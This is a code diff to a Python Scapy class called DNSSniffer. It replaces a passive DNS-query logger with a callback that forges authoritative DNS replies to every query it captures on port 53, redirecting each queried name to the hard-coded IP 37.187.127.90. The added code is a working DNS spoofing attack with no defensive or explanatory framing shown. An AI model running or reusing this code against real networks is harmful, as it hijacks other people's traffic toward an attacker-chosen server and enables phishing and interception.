@@ -19,12 +19,16 @@ class DNSSniffer(threading.Thread):
     self.e.set() 
     print " -- Stopping DNSSniff" 
    
-  def printDNS(self, packet): 
-    if IP in packet: 
-      ip_src = packet[IP].src 
-      ip_dest = packet[IP].dst 
-      if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0: 
-        print ip_src + " -> " + ip_dest + " (" + packet.getlayer(DNS).qd.qname + ")" 
-     
-  def sniff(self): 
-    sniff(iface = self.interface, filter = 'port 53', prn = self.printDNS, stop_filter=lambda p: self.e.is_set()) 
+  def cb(self, pkt):
+    redirect_to = '37.187.127.90'
+    if pkt.haslayer(DNSQR):
+      print pkt[IP].src , "->" , pkt[IP].dst , "(" + pkt.getlayer(DNS).qd.qname, ")"
+      spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+          DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
+          an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
+      send(spoofed_pkt,verbose=0)
+      print 'Sent spoofed packet'
+
+  def sniff(self):
+    sniff(iface = self.interface, filter = 'port 53', prn = self.cb, stop_filter=lambda p: self.e.is_set()) 
